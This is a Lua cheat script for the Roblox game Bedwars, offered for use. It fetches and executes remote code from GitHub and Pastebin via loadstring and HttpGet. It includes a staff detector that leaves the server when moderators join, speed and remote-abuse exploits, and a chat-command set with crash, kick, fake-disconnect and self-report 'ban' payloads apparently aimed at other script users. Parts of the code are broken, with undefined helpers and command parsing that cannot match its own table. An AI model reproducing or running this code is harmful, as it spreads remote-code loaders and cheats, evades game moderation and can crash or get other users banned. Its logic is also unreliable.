repeat task.wait() until game:IsLoaded()
loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
wait(2)
local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
local Window = Library.CreateLib("Bedwars", "DarkTheme")

local Tab = Window:NewTab("Main")
local Section = Tab:NewSection("Main")

Section:NewButton("StaffDetector (AutoLeave)", "", function()
    local groupId = 5774246
    local roleId = 121

    local function checkUserRole(player)
        if player:IsInGroup(groupId) and player:GetRankInGroup(groupId) == roleId then
            warningNotification("PV+ Notify", "A Staff Has Joined The Game, Leaving....", 60)
            wait(2)
            bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
        end
    end

    local function checkAllUsersRoles()
        for _, player in pairs(game.Players:GetPlayers()) do
            checkUserRole(player)
        end
    end

    checkAllUsersRoles()
end)

Section:NewButton("StaffDetector", "", function()
    local groupId = 5774246
    local roleId = 121

    local function checkUserRole(player)
        if player:IsInGroup(groupId) and player:GetRankInGroup(groupId) == roleId then
            warningNotification("PV+ Notify", "A Staff Has Joined The Game.", 10)
        end
    end

    local function checkAllUsersRoles()
        for _, player in pairs(game.Players:GetPlayers()) do
            checkUserRole(player)
        end
    end

    checkAllUsersRoles()
end)

Section:NewButton("Disabler", "This Disabler Can Go Over 500+ Speed", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 500
    task.spawn(function()
        repeat
            task.wait(0.03)
            local item = getItemNear("scythe")
            if item and lplr.Character.HandInvItem.Value == item.tool then 
                bedwars.ClientHandler:Get("ScytheDash"):SendToServer({direction = Vector3.new(9e9, 9e9, 9e9)})
            end
        until not game.Players.LocalPlayer.Character or not game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
    end)
end)

Section:NewButton("SpeedBooster", "", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 35
    createwarning("PV+ Notify", "Don't Spam", 2)
    wait(2)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 25
end)

Section:NewButton("DemonSlayerPack", "", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PVOwner/Module/main/TexturePackV1"))()
end)

Section:NewButton("512xPack", "", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/512xPack"))()
end)

Section:NewButton("1056xPack", "", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/1024xPack"))()
end)

Section:NewButton("ZephyrBypass", "", function()
    for i, player in ipairs(game.Players:GetPlayers()) do
        player:registerSpeedMultiplier("speed-boost", 3)
        player:registerAdditionalAirJumps("bounce", 1)
    end
    task.wait(30)
    for i, player in ipairs(game.Players:GetPlayers()) do
        player:removeSpeedMultiplier("speed-boost")
        player:removeAdditionalAirJumps("bounce")
    end
end)

local plrtype = "PV+ OWNER"

local priolist = {
    ["DEFAULT"] = 0,
    ["PV+ PRIVATE"] = 1,
    ["PV+ OWNER"] = 2,
}

local alreadysaidlist = {}

local function findplayers(arg)
    local temp = {}
    local continuechecking = true

    if arg == "default" and continuechecking and bedwars["CheckPlayerType"](lplr) == "DEFAULT" then
        table.insert(temp, lplr)
        continuechecking = false
    end
    if arg == "private" and continuechecking and bedwars["CheckPlayerType"](lplr) == "PV+ PRIVATE" then
        table.insert(temp, lplr)
        continuechecking = false
    end

    for i, v in pairs(game:GetService("Players"):GetChildren()) do
        if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then
            table.insert(temp, v)
            continuechecking = false
        end
    end

    return temp
end

local commands = {
    [";kill"] = function(args)
        game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
    end,
    [";reveal"] = function(args)
        local textChatService = game:GetService("TextChatService")
        wait(0.0001)
        textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("I Using PV+ Private No Cap")
    end,
    [";void"] = function(args)
        if not isPlayerAllowed(lplr.Name) then
            local character = lplr.Character
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
            local newPosition = humanoidRootPart.CFrame
            for i = 1, 3 do
                newPosition = newPosition + Vector3.new(0, -40, 0)
                humanoidRootPart.CFrame = newPosition
                wait(0.01)
            end
        end
    end,
    [";blind"] = function(args)
        local blur = Instance.new("BlurEffect")
        blur.Size = 10000000000000
        blur.Parent = game.Lighting
    end,
    [";unblind"] = function(args)
        local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
        if blur then
            blur:Destroy()
        end
    end,
    [";troll"] = function(args)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
    end,
    [";kick"] = function(args)
        wait(1)
        for index, player in pairs(game.Players:GetPlayers()) do
            player:Kick("PV+ Kick You")
        end
    end,
    [";ban"] = function(args)
        local rs = game:GetService("ReplicatedStorage")
        local remote = rs:FindFirstChild("SelfReport", true)
        remote:FireServer("injection_detected")
    end,
    [";rickroll"] = function(args)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
    end,
    [";freeze"] = function(args)
        game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
    end,
    [";thaw"] = function(args)
        game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
    end,
    [";lobby"] = function(args)
        game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
    end,
    [";quit"] = function(args)
        game:Shutdown()
    end,
    [";lagback"] = function(args)
        for i = 1, 10 do
            wait()
            local player = lplr
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
            local forwardVector = humanoidRootPart.CFrame.LookVector
            local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
            humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
        end
    end,
    [";bgame"] = function(args)
        pcall(function()
            local replicatedStorage = game:GetService("ReplicatedStorage")
            for _, child in ipairs(replicatedStorage:GetDescendants()) do
                child:Destroy()
            end
        end)
    end,
    [";bmap"] = function(args)
        local function unanchorParts(object)
            if object:IsA("BasePart") then
                object.Anchored = false
            end
            for _, child in ipairs(object:GetChildren()) do
                unanchorParts(child)
            end
        end
        unanchorParts(workspace)
    end,
    [";crash"] = function(args)
        if not isPlayerAllowed(lplr.Name) then
            while true do end
        end
    end,
    [";ping"] = function(args)
        local thingy = settings().Network
        thingy.IncomingReplicationLag = math.huge
    end,
    [";lag"] = function(args)
        local RunService = game:GetService("RunService")
        local player = lplr
        local character = player.Character or player.CharacterAdded:Wait()
        local rootPart = character:WaitForChild("HumanoidRootPart")
        RunService.Heartbeat:Connect(function()
            for i = 1, 100 do
                local part = Instance.new("Part")
                part.Anchored = false
                part.CanCollide = true
                part.Transparency = 1
                part.CFrame = rootPart.CFrame + Vector3.new(0, 100000, 0)
                part.Parent = workspace
            end
        end)
    end,
    [";loopkill"] = function(args)
        _G.loopkill = true
        while _G.loopkill do
            game.Players.LocalPlayer.Character.Humanoid.Health = 0
            wait(4)
        end
    end,
    [";unloopkill"] = function(args)
        _G.loopkill = false
        while _G.loopkill do
            game.Players.LocalPlayer.Character.Humanoid.Health = 0
            wait(3)
        end
    end,
    [";jump"] = function(args)
        if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") and game.Players.LocalPlayer.Character.Humanoid.FloorMaterial ~= Enum.Material.Air then
            game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
        end
    end,
    [";sit"] = function(args)
        if game.Players.LocalPlayer.Character then
            game.Players.LocalPlayer.Character.Humanoid.Sit = true
        end
    end,
    [";unsit"] = function(args)
        if game.Players.LocalPlayer.Character then
            game.Players.LocalPlayer.Character.Humanoid.Sit = false
        end
    end,
    [";chipman"] = function(args)
        local function funnyfunc(v)
            if v:IsA("ImageLabel") or v:IsA("ImageButton") then
                v.Image = "http://www.roblox.com/asset/?id=6864086702"
                v:GetPropertyChangedSignal("Image"):connect(function()
                    v.Image = "http://www.roblox.com/asset/?id=6864086702"
                end)
            end
            if (v:IsA("TextLabel") or v:IsA("TextButton")) and v:GetFullName():find("ChatChannelParentFrame") == nil then
                if v.Text ~= "" then
                    v.Text = "chips"
                end
                v:GetPropertyChangedSignal("Text"):connect(function()
                    if v.Text ~= "" then
                        v.Text = "chips"
                    end
                end)
            end
            if v:IsA("Texture") or v:IsA("Decal") then
                v.Texture = "http://www.roblox.com/asset/?id=6864086702"
                v:GetPropertyChangedSignal("Texture"):connect(function()
                    v.Texture = "http://www.roblox.com/asset/?id=6864086702"
                end)
            end
            if v:IsA("MeshPart") then
                v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
                v:GetPropertyChangedSignal("TextureID"):connect(function()
                    v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
                end)
            end
            if v:IsA("SpecialMesh") then
                v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
                v:GetPropertyChangedSignal("TextureId"):connect(function()
                    v.TextureId = "http://www.roblox.com/asset/?id=6864086702"
                end)
            end
            if v:IsA("Sky") then
                v.SkyboxBk = "http://www.roblox.com/asset/?id=6864086702"
                v.SkyboxDn = "http://www.roblox.com/asset/?id=6864086702"
                v.SkyboxFt = "http://www.roblox.com/asset/?id=6864086702"
                v.SkyboxLf = "http://www.roblox.com/asset/?id=6864086702"
                v.SkyboxRt = "http://www.roblox.com/asset/?id=6864086702"
                v.SkyboxUp = "http://www.roblox.com/asset/?id=6864086702"
            end
        end

        for i, v in pairs(game:GetDescendants()) do
            funnyfunc(v)
        end
        game.DescendantAdded:connect(funnyfunc)
    end,
    [";uninject"] = function(args)
        GuiLibrary["SelfDestruct"]()
    end,
    [";disconnect"] = function(args)
        game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay").DescendantAdded:Connect(function(obj)
            if obj.Name == "ErrorMessage" then
                obj:GetPropertyChangedSignal("Text"):connect(function()
                    obj.Text = "Please check your internet connection and try again.\n(Error Code: 277)"
                end)
            end
            if obj.Name == "LeaveButton" then
                local clone = obj:Clone()
                clone.Name = "LeaveButton2"
                clone.Parent = obj.Parent
                clone.MouseButton1Click:connect(function()
                    clone.Visible = false
                    local video = Instance.new("VideoFrame")
                    video.Video = getcustomassetfunc("vape/assets/skill.webm")
                    video.Size = UDim2.new(1, 0, 1, 36)
                    video.Visible = false
                    video.Position = UDim2.new(0, 0, 0, -36)
                    video.ZIndex = 9
                    video.BackgroundTransparency = 1
                    video.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
                    local textlab = Instance.new("TextLabel")
                    textlab.TextSize = 45
                    textlab.ZIndex = 10
                    textlab.Size = UDim2.new(1, 0, 1, 36)
                    textlab.TextColor3 = Color3.new(1, 1, 1)
                    textlab.Text = "skill issue"
                    textlab.Position = UDim2.new(0, 0, 0, -36)
                    textlab.Font = Enum.Font.Gotham
                    textlab.BackgroundTransparency = 1
                    textlab.Parent = game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
                    video.Loaded:connect(function()
                        video.Visible = true
                        video:Play()
                        task.spawn(function()
                            repeat
                                wait()
                                for i = 0, 1, 0.01 do
                                    wait(0.01)
                                    textlab.TextColor3 = Color3.fromHSV(i, 1, 1)
                                end
                            until true == false
                        end)
                    end)
                    task.wait(19)
                    task.spawn(function()
                        pcall(function()
                            if getconnections then
                                getconnections(entity.character.Humanoid.Died)
                            end
                            print(game:GetObjects("h29g3535")[1])
                        end)
                        while true do end
                    end)
                end)
                obj.Visible = false
            end
        end)
        task.wait(0.1)
        lplr:Kick()
    end,
    [";staffkick"] = function(args)
        game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
    end,
}

local function executeCommand(cmd, args)
    local cmdFunction = commands[cmd]
    if cmdFunction then
        cmdFunction(args)
    end
end

local function onChatted(msg)
    local args = msg:split(" ")
    local cmd = args[1]:sub(2):lower()

    if priolist[plrtype] then
        if plrtype == "PV+ OWNER" then
            table.remove(args, 1)
            executeCommand(cmd, args)
        elseif plrtype == "PV+ PRIVATE" then
            table.remove(args, 1)
            executeCommand(cmd, args)
        end
    end
end

game:GetService("Players").LocalPlayer.Chatted:Connect(onChatted)
